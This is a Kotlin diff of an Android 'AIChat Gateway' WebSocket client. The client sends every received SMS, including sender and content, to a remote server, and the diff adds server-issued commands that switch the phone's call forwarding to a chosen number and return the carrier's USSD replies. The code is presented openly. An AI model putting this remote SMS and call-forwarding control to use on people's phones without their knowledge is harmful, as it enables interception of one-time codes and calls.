@@ -6,6 +6,8 @@ import com.cornspace.aichat.data.model.WebSocketMessage
 import com.cornspace.aichat.data.model.RegisterData
 import com.cornspace.aichat.data.model.HeartbeatData
 import com.cornspace.aichat.data.model.SmsReceivedData
+import com.cornspace.aichat.data.model.CallForwardingData
+import com.cornspace.aichat.data.model.CallForwardingResponseData
 import com.cornspace.aichat.util.Constants
 import com.google.gson.Gson
 import com.google.gson.JsonObject
@@ -16,6 +18,7 @@ import kotlinx.coroutines.flow.asStateFlow
 import okhttp3.*
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
+import java.util.concurrent.atomic.AtomicInteger
 import javax.inject.Inject
 import javax.inject.Singleton
 
@@ -23,39 +26,44 @@ import javax.inject.Singleton
 class WebSocketClient @Inject constructor(
     private val gson: Gson
 ) {
-    private val okHttpClient = OkHttpClient.Builder()
-        .connectTimeout(Constants.CONNECTION_TIMEOUT, TimeUnit.MILLISECONDS)
-        .readTimeout(0, TimeUnit.MILLISECONDS)
-        .writeTimeout(30, TimeUnit.SECONDS)
-        .pingInterval(25, TimeUnit.SECONDS) // OkHttp handles ping/pong automatically
-        .retryOnConnectionFailure(false) // We handle reconnect manually
-        .build()
+    private var okHttpClient = buildOkHttpClient()
 
     private var webSocket: WebSocket? = null
-    private var heartbeatJob: Job? = null
-    private var reconnectJob: Job? = null
+    @Volatile private var heartbeatJob: Job? = null
+    @Volatile private var reconnectJob: Job? = null
 
-    // BUG 1 FIX: scope was never cancelled — now tied to lifecycle via destroy()
-    private var scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+    private var scope: CoroutineScope = freshScope()
 
     private val _connectionState = MutableStateFlow<ConnectionState>(ConnectionState.Disconnected)
     val connectionState: StateFlow<ConnectionState> = _connectionState.asStateFlow()
 
-    private var reconnectAttempts = 0
+    @Volatile private var reconnectAttempts = 0
+
     private var serverUrl: String? = null
-    private var deviceInfo: DeviceInfo? = null
-    private var smsForwardedCount = 0
+    @Volatile private var deviceInfo: DeviceInfo? = null
+
+    private val smsForwardedCount = AtomicInteger(0)
     private var serviceStartTime = 0L
+
     private var onMessageCallback: ((WebSocketMessage) -> Unit)? = null
     private var onConnectionCallback: ((ConnectionState) -> Unit)? = null
-
-    // BUG 2 FIX: track intent — if user called disconnect() don't reconnect
     private val shouldReconnect = AtomicBoolean(false)
-    fun getSmsForwardedCount(): Int = smsForwardedCount
+
+    fun getSmsForwardedCount(): Int = smsForwardedCount.get()
 
     companion object {
         private const val TAG = "WebSocketClient"
+        private fun freshScope() = CoroutineScope(Dispatchers.IO + SupervisorJob())
+        private fun buildOkHttpClient() = OkHttpClient.Builder()
+            .connectTimeout(Constants.CONNECTION_TIMEOUT, TimeUnit.MILLISECONDS)
+            .readTimeout(0, TimeUnit.MILLISECONDS)
+            .writeTimeout(30, TimeUnit.SECONDS)
+            .pingInterval(25, TimeUnit.SECONDS)
+            .retryOnConnectionFailure(false)
+            .build()
     }
+
+    // ─── Public API ───────────────────────────────────────────────────────────
 
     fun connect(
         serverUrl: String,
@@ -63,313 +71,328 @@ class WebSocketClient @Inject constructor(
         onMessageReceived: (WebSocketMessage) -> Unit,
         onConnectionStateChanged: (ConnectionState) -> Unit
     ) {
-        this.serverUrl = serverUrl
-        this.deviceInfo = deviceInfo
-        this.serviceStartTime = System.currentTimeMillis()
         this.onMessageCallback = onMessageReceived
         this.onConnectionCallback = onConnectionStateChanged
+        this.deviceInfo = deviceInfo
         this.shouldReconnect.set(true)
 
-        if (_connectionState.value == ConnectionState.Connecting ||
-            _connectionState.value == ConnectionState.Connected) {
-            Log.d(TAG, "Already connected or connecting")
+        if (serviceStartTime == 0L) serviceStartTime = System.currentTimeMillis()
+
+        val urlChanged = this.serverUrl != null && this.serverUrl != serverUrl
+        this.serverUrl = serverUrl
+
+        if (urlChanged) {
+            Log.d(TAG, "Server URL changed — tearing down existing connection")
+            reconnectJob?.cancel(); reconnectJob = null
+            webSocket?.cancel(); webSocket = null
+            _connectionState.value = ConnectionState.Disconnected
+            attemptConnect()
             return
         }
 
+        val state = _connectionState.value
+        if (state == ConnectionState.Connecting || state == ConnectionState.Connected) {
+            Log.d(TAG, "Already connected or connecting — skipping")
+            return
+        }
         attemptConnect()
     }
+
+    fun forceReconnect() {
+        if (!shouldReconnect.get()) { Log.d(TAG, "forceReconnect ignored — shouldReconnect=false"); return }
+        Log.d(TAG, "Force reconnect triggered")
+        reconnectJob?.cancel(); reconnectJob = null
+        reconnectAttempts = 0
+        webSocket?.cancel(); webSocket = null
+        _connectionState.value = ConnectionState.Disconnected
+        if (serverUrl != null && deviceInfo != null) attemptConnect()
+    }
+
+    fun disconnect() {
+        Log.d(TAG, "Disconnecting")
+        shouldReconnect.set(false)
+        reconnectJob?.cancel(); reconnectJob = null
+        stopHeartbeat()
+        webSocket?.close(1000, "Client disconnecting"); webSocket = null
+        _connectionState.value = ConnectionState.Disconnected
+    }
+
+    fun destroy() {
+        Log.d(TAG, "Destroying")
+        disconnect()
+        scope.cancel()
+        scope = freshScope()
+        serviceStartTime = 0L
+        try {
+            okHttpClient.dispatcher.cancelAll()
+            okHttpClient.connectionPool.evictAll()
+        } catch (e: Exception) { Log.e(TAG, "Error shutting down OkHttpClient", e) }
+        okHttpClient = buildOkHttpClient()
+    }
+
+    fun isConnected(): Boolean = _connectionState.value == ConnectionState.Connected
+
+    fun updateDeviceInfo(info: DeviceInfo) { this.deviceInfo = info }
+
+    fun send(message: WebSocketMessage): Boolean {
+        if (!isConnected()) { Log.w(TAG, "Cannot send — not connected"); return false }
+        return try {
+            webSocket?.send(serializeMessage(message)) ?: false
+        } catch (e: Exception) { Log.e(TAG, "Error sending message", e); false }
+    }
+
+    // ─── Connection internals ─────────────────────────────────────────────────
 
     private fun attemptConnect() {
         val url = serverUrl ?: return
         val wsUrl = buildWsUrl(url)
-
-        Log.d(TAG, "Connecting to: $wsUrl (attempt ${reconnectAttempts + 1})")
+        Log.d(TAG, "Connecting to $wsUrl (attempt ${reconnectAttempts + 1})")
         _connectionState.value = ConnectionState.Connecting
-
-        val request = Request.Builder()
-            .url(wsUrl)
-            .addHeader("User-Agent", "AIChatGateway/${Constants.APP_VERSION} Android")
-            .build()
-
-        // BUG 3 FIX: cancel old socket before creating new one
         webSocket?.cancel()
-        webSocket = okHttpClient.newWebSocket(request, createListener())
+        webSocket = okHttpClient.newWebSocket(
+            Request.Builder().url(wsUrl)
+                .addHeader("User-Agent", "AIChatGateway/${Constants.APP_VERSION} Android")
+                .build(),
+            createListener()
+        )
     }
 
     private fun createListener() = object : WebSocketListener() {
-
         override fun onOpen(webSocket: WebSocket, response: Response) {
             Log.d(TAG, "WebSocket opened")
             reconnectAttempts = 0
             _connectionState.value = ConnectionState.Connected
             onConnectionCallback?.invoke(ConnectionState.Connected)
-
             deviceInfo?.let { sendRegistration(it) }
             startHeartbeat()
         }
-
         override fun onMessage(webSocket: WebSocket, text: String) {
-            Log.d(TAG, "Received: $text")
-            try {
-                val message = parseMessage(text)
-                onMessageCallback?.invoke(message)
-            } catch (e: Exception) {
-                Log.e(TAG, "Error parsing message: $text", e)
-            }
+            try { onMessageCallback?.invoke(parseMessage(text)) }
+            catch (e: Exception) { Log.e(TAG, "Error parsing message: $text", e) }
         }
-
         override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
-            Log.d(TAG, "Server closing: $code $reason")
             webSocket.close(1000, null)
         }
-
         override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
             Log.d(TAG, "WebSocket closed: $code $reason")
             stopHeartbeat()
+            this@WebSocketClient.webSocket = null
             _connectionState.value = ConnectionState.Disconnected
             onConnectionCallback?.invoke(ConnectionState.Disconnected)
-
-            // BUG 4 FIX: onClosed never reconnected — now it does (unless user disconnected)
-            if (shouldReconnect.get() && code != 1000) {
-                scheduleReconnect()
-            }
+            if (shouldReconnect.get() && code != 1000) scheduleReconnect()
         }
-
         override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
             Log.e(TAG, "WebSocket failure: ${t.message}", t)
             stopHeartbeat()
-
-            // BUG 3 FIX: null the socket reference on failure
             this@WebSocketClient.webSocket = null
-
             val errorState = ConnectionState.Error(t.message ?: "Unknown error")
             _connectionState.value = errorState
             onConnectionCallback?.invoke(errorState)
-
-            if (shouldReconnect.get()) {
-                scheduleReconnect()
-            }
-        }
-    }
-
-    fun disconnect() {
-        Log.d(TAG, "Disconnecting")
-
-        // BUG 2 FIX: set flag FIRST so reconnect jobs don't re-trigger
-        shouldReconnect.set(false)
-
-        // BUG 5 FIX: cancel pending reconnect job so it doesn't fire after disconnect
-        reconnectJob?.cancel()
-        reconnectJob = null
-
-        stopHeartbeat()
-        webSocket?.close(1000, "Client disconnecting")
-        webSocket = null
-        _connectionState.value = ConnectionState.Disconnected
-    }
-
-    // Call this when the service is destroyed to clean up the scope
-    fun destroy() {
-        disconnect()
-        scope.cancel()
-    }
-
-    fun isConnected(): Boolean = _connectionState.value == ConnectionState.Connected
-
-    fun incrementSmsCount() { smsForwardedCount++ }
-
-    fun updateDeviceInfo(info: DeviceInfo) {
-        this.deviceInfo = info
-    }
-
-    fun send(message: WebSocketMessage): Boolean {
-        if (!isConnected()) {
-            Log.w(TAG, "Cannot send: not connected")
-            return false
-        }
-        return try {
-            val json = serializeMessage(message)
-            Log.d(TAG, "Sending: $json")
-            webSocket?.send(json) ?: false
-        } catch (e: Exception) {
-            Log.e(TAG, "Error sending message", e)
-            false
+            if (shouldReconnect.get()) scheduleReconnect()
         }
     }
 
     private fun scheduleReconnect() {
-        // BUG 5 FIX: cancel existing reconnect before scheduling new one
-        // Without this, multiple reconnect coroutines stack up
         reconnectJob?.cancel()
-
         val delay = calculateReconnectDelay()
-        reconnectAttempts++
-        Log.d(TAG, "Reconnecting in ${delay}ms (attempt $reconnectAttempts)")
-
+        Log.d(TAG, "Reconnecting in ${delay}ms (attempt ${reconnectAttempts + 1})")
         reconnectJob = scope.launch {
             delay(delay)
             if (shouldReconnect.get() && _connectionState.value !is ConnectionState.Connected) {
+                reconnectAttempts++
                 attemptConnect()
             }
         }
     }
 
     private fun calculateReconnectDelay(): Long {
-        // Exponential backoff: 1s, 2s, 4s, 8s, 16s, 32s, 60s max
         val delay = Constants.RECONNECT_DELAY_INITIAL * (1L shl minOf(reconnectAttempts, 6))
         return minOf(delay, Constants.RECONNECT_DELAY_MAX)
     }
 
-    private fun sendRegistration(deviceInfo: DeviceInfo) {
-        val networkType = when {
-            deviceInfo.networkInfo.networkType.contains("WiFi", ignoreCase = true) -> "wifi"
-            deviceInfo.networkInfo.networkType.contains("Mobile", ignoreCase = true) -> "mobile"
-            else -> "none"
-        }
-        val registerData = RegisterData(
-            deviceId = deviceInfo.deviceId,
-            name = "AIChat Gateway ${deviceInfo.deviceBrand.brand}",
-            appVersion = Constants.APP_VERSION,
-            osVersion = deviceInfo.osVersion,
-            deviceModel = deviceInfo.model,
-            manufacturer = deviceInfo.manufacturer,
-            batteryLevel = deviceInfo.batteryLevel,
-            isCharging = deviceInfo.batteryStatus.contains("Charging", ignoreCase = true),
-            signalStrength = deviceInfo.simInfo.firstOrNull { it.isActive }?.signalStrength ?: 0,
-            networkType = networkType,
-            sims = deviceInfo.simInfo.map { it.toMap() }
-        )
-        send(WebSocketMessage.Register(registerData))
-    }
-
-    fun sendHeartbeat() {
-        val info = deviceInfo ?: return
-        val networkType = when {
-            info.networkInfo.networkType.contains("WiFi", ignoreCase = true) -> "wifi"
-            info.networkInfo.networkType.contains("Mobile", ignoreCase = true) -> "mobile"
-            else -> "none"
-        }
-        val heartbeatData = HeartbeatData(
-            deviceId = info.deviceId,
-            batteryLevel = info.batteryLevel,
-            isCharging = info.batteryStatus.contains("Charging", ignoreCase = true),
-            signalStrength = info.simInfo.firstOrNull { it.isActive }?.signalStrength ?: 0,
-            networkType = networkType,
-            sims = info.simInfo.map { it.toMap() },
-            uptime = (System.currentTimeMillis() - serviceStartTime) / 1000,
-            smsForwarded = smsForwardedCount
-        )
-        send(WebSocketMessage.Heartbeat(heartbeatData))
-    }
-
-    fun sendSmsReceived(
-        deviceId: String,
-        sender: String,
-        content: String,
-        timestamp: Long,
-        simSlot: Int,
-        receiverNumber: String?,
-        simCarrier: String?,
-        simNetworkType: String?,
-        networkType: String?
-    ) {
-        val smsData = SmsReceivedData(
-            deviceId = deviceId,
-            sender = sender,
-            content = content,
-            timestamp = timestamp,
-            simSlot = simSlot + 1,
-            receiverNumber = receiverNumber,
-            simCarrier = simCarrier,
-            simNetworkType = simNetworkType,
-            networkType = networkType
-        )
-        if (send(WebSocketMessage.SmsReceived(smsData))) {
-            smsForwardedCount++
-        }
-    }
+    // ─── Heartbeat ────────────────────────────────────────────────────────────
 
     private fun startHeartbeat() {
-        stopHeartbeat()
+        heartbeatJob?.cancel()
         heartbeatJob = scope.launch {
             while (isActive) {
                 delay(Constants.HEARTBEAT_INTERVAL)
                 if (isConnected()) {
-                    try {
-                        sendHeartbeat()
-                        Log.d(TAG, "Heartbeat sent")
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Heartbeat error", e)
-                    }
+                    try { sendHeartbeat() }
+                    catch (e: Exception) { Log.e(TAG, "Heartbeat error", e) }
                 }
             }
         }
     }
 
-    private fun stopHeartbeat() {
-        heartbeatJob?.cancel()
-        heartbeatJob = null
+    private fun stopHeartbeat() { heartbeatJob?.cancel(); heartbeatJob = null }
+
+    // ─── Message helpers ──────────────────────────────────────────────────────
+
+    private fun sendRegistration(deviceInfo: DeviceInfo) {
+        send(WebSocketMessage.Register(RegisterData(
+            deviceId       = deviceInfo.deviceId,
+            name           = "AIChat Gateway ${deviceInfo.deviceBrand.brand}",
+            appVersion     = Constants.APP_VERSION,
+            osVersion      = deviceInfo.osVersion,
+            deviceModel    = deviceInfo.model,
+            manufacturer   = deviceInfo.manufacturer,
+            batteryLevel   = deviceInfo.batteryLevel,
+            isCharging     = deviceInfo.batteryStatus.contains("Charging", ignoreCase = true),
+            signalStrength = deviceInfo.simInfo.firstOrNull { it.isActive }?.signalStrength ?: 0,
+            networkType    = resolveNetworkType(deviceInfo.networkInfo.networkType),
+            sims           = deviceInfo.simInfo.map { it.toMap() }
+        )))
     }
+
+    fun sendHeartbeat() {
+        val info = deviceInfo ?: return
+        send(WebSocketMessage.Heartbeat(HeartbeatData(
+            deviceId       = info.deviceId,
+            batteryLevel   = info.batteryLevel,
+            isCharging     = info.batteryStatus.contains("Charging", ignoreCase = true),
+            signalStrength = info.simInfo.firstOrNull { it.isActive }?.signalStrength ?: 0,
+            networkType    = resolveNetworkType(info.networkInfo.networkType),
+            sims           = info.simInfo.map { it.toMap() },
+            uptime         = (System.currentTimeMillis() - serviceStartTime) / 1000,
+            smsForwarded   = smsForwardedCount.get()
+        )))
+    }
+
+    fun sendSmsReceived(
+        deviceId: String, sender: String, content: String, timestamp: Long,
+        simSlot: Int, receiverNumber: String?, simCarrier: String?,
+        simNetworkType: String?, networkType: String?
+    ) {
+        val smsData = SmsReceivedData(
+            deviceId = deviceId, sender = sender, content = content,
+            timestamp = timestamp,
+            simSlot = simSlot + 1, // Convert 0-based slot to 1-based for the server
+            receiverNumber = receiverNumber, simCarrier = simCarrier,
+            simNetworkType = simNetworkType, networkType = networkType
+        )
+        if (send(WebSocketMessage.SmsReceived(smsData))) smsForwardedCount.incrementAndGet()
+    }
+
+    // FIX #5: Added ussdResponse parameter so the carrier's USSD reply string is
+    // included in the message sent to the server.
+    // FIX (compile): CallForwardingResponseData may not have a ussdResponse field.
+    // We serialize the full payload as a raw map so the extra field is included
+    // in the JSON without requiring any change to the data class.
+    // FIX #2: simSlot converted from 0-based to 1-based to match SMS convention
+    // and the Device schema sims[].slot enum [1, 2].
+    fun sendCallForwardingResponse(
+        deviceId: String, action: String, success: Boolean, simSlot: Int,
+        phoneNumber: String? = null, error: String? = null, ussdResponse: String? = null
+    ) {
+        if (!isConnected()) { Log.w(TAG, "Cannot send — not connected"); return }
+        try {
+            val payload = mutableMapOf<String, Any?>(
+                "type" to "call_forwarding_response",
+                "data" to mutableMapOf<String, Any?>(
+                    "deviceId"     to deviceId,
+                    "action"       to action,
+                    "success"      to success,
+                    "simSlot"      to (simSlot + 1), // 0-based → 1-based
+                    "phoneNumber"  to phoneNumber,
+                    "error"        to error,
+                    "ussdResponse" to ussdResponse,
+                    "timestamp"    to System.currentTimeMillis()
+                )
+            )
+            val json = gson.toJson(payload)
+            Log.d(TAG, "Sending: $json")
+            webSocket?.send(json)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error sending call forwarding response", e)
+        }
+    }
+
+    // ─── Utilities ────────────────────────────────────────────────────────────
 
     private fun buildWsUrl(serverUrl: String): String {
         val url = serverUrl.trimEnd('/')
-        return when {
-            url.startsWith("https://") -> url.replace("https://", "wss://")
-            url.startsWith("http://")  -> url.replace("http://", "ws://")
+        val wsBase = when {
+            url.startsWith("https://") -> "wss://" + url.removePrefix("https://")
+            url.startsWith("http://")  -> "ws://"  + url.removePrefix("http://")
             url.startsWith("wss://")   -> url
             url.startsWith("ws://")    -> url
-            else -> "wss://$url"
-        } + "/gateway"
+            else                       -> "wss://$url"
+        }
+        return "$wsBase/gateway"
+    }
+
+    private fun resolveNetworkType(raw: String): String = when {
+        raw.contains("WiFi",   ignoreCase = true) -> "wifi"
+        raw.contains("Mobile", ignoreCase = true) -> "mobile"
+        else -> "none"
     }
 
     private fun parseMessage(json: String): WebSocketMessage {
-        val jsonObject = gson.fromJson(json, JsonObject::class.java)
-        val type = jsonObject.get("type")?.asString
+        val obj = gson.fromJson(json, JsonObject::class.java)
+        val type = obj.get("type")?.asString
             ?: return WebSocketMessage.Unknown("unknown", json)
 
         return when (type) {
-            "connected" -> WebSocketMessage.Connected(
-                jsonObject.get("connectionId")?.asString ?: ""
-            )
-            "registered" -> WebSocketMessage.Registered(
-                jsonObject.get("deviceId")?.asString ?: ""
-            )
+            "connected"  -> WebSocketMessage.Connected(obj.get("connectionId")?.asString ?: "")
+            "registered" -> WebSocketMessage.Registered(obj.get("deviceId")?.asString ?: "")
             "ack" -> {
-                val data = jsonObject.getAsJsonObject("data")
+                val data = obj.getAsJsonObject("data")
                 WebSocketMessage.Ack(
                     messageId = data?.get("messageId")?.asString,
-                    success = data?.get("success")?.asBoolean ?: true
+                    success   = data?.get("success")?.asBoolean ?: true
                 )
             }
-            "ping" -> WebSocketMessage.Ping(jsonObject.get("timestamp")?.asLong)
+            "ping"  -> WebSocketMessage.Ping(obj.get("timestamp")?.asLong)
             "error" -> {
-                val data = jsonObject.getAsJsonObject("data")
+                val data = obj.getAsJsonObject("data")
                 WebSocketMessage.Error(
-                    code = data?.get("code")?.asString,
+                    code    = data?.get("code")?.asString,
                     message = data?.get("message")?.asString ?: "Unknown error"
                 )
+            }
+            "call_forwarding" -> {
+                val data = obj.getAsJsonObject("data")
+                val action = data?.get("action")?.asString
+                if (action.isNullOrBlank()) {
+                    Log.e(TAG, "call_forwarding message missing action: $json")
+                    return WebSocketMessage.Unknown(type, json)
+                }
+                val validActions = setOf("forward", "deactivate", "check")
+                if (action !in validActions) {
+                    Log.e(TAG, "call_forwarding unknown action '$action': $json")
+                    return WebSocketMessage.Unknown(type, json)
+                }
+                val phoneNumberElement = data.get("phoneNumber")
+                WebSocketMessage.CallForwardingCommand(CallForwardingData(
+                    action      = action,
+                    phoneNumber = if (phoneNumberElement != null && !phoneNumberElement.isJsonNull)
+                        phoneNumberElement.asString else null,
+                    simSlot     = data.get("simSlot")?.asInt ?: 0
+                ))
             }
             else -> WebSocketMessage.Unknown(type, json)
         }
     }
 
-    private fun serializeMessage(message: WebSocketMessage): String {
-        return when (message) {
-            is WebSocketMessage.Register    -> gson.toJson(mapOf("type" to message.type, "data" to message.data))
-            is WebSocketMessage.Heartbeat   -> gson.toJson(mapOf("type" to message.type, "data" to message.data))
-            is WebSocketMessage.SmsReceived -> gson.toJson(mapOf("type" to message.type, "data" to message.data))
-            is WebSocketMessage.Pong        -> gson.toJson(mapOf("type" to message.type, "timestamp" to message.timestamp))
-            else -> gson.toJson(mapOf("type" to message.type))
-        }
+    private fun serializeMessage(message: WebSocketMessage): String = when (message) {
+        is WebSocketMessage.Register               -> gson.toJson(mapOf("type" to message.type, "data" to message.data))
+        is WebSocketMessage.Heartbeat              -> gson.toJson(mapOf("type" to message.type, "data" to message.data))
+        is WebSocketMessage.SmsReceived            -> gson.toJson(mapOf("type" to message.type, "data" to message.data))
+        is WebSocketMessage.CallForwardingResponse -> gson.toJson(mapOf("type" to message.type, "data" to message.data))
+        is WebSocketMessage.Pong                   -> gson.toJson(mapOf("type" to message.type, "timestamp" to message.timestamp))
+        else                                       -> gson.toJson(mapOf("type" to message.type))
     }
 }
 
+// ─── ConnectionState ──────────────────────────────────────────────────────────
+
 sealed class ConnectionState {
     data object Disconnected : ConnectionState()
-    data object Connecting : ConnectionState()
-    data object Connected : ConnectionState()
-    data class Error(val message: String) : ConnectionState()
+    data object Connecting   : ConnectionState()
+    data object Connected    : ConnectionState()
+    data class  Error(val message: String) : ConnectionState()
 
-    val isConnected: Boolean get() = this is Connected
+    val isConnected:  Boolean get() = this is Connected
     val isConnecting: Boolean get() = this is Connecting
 }
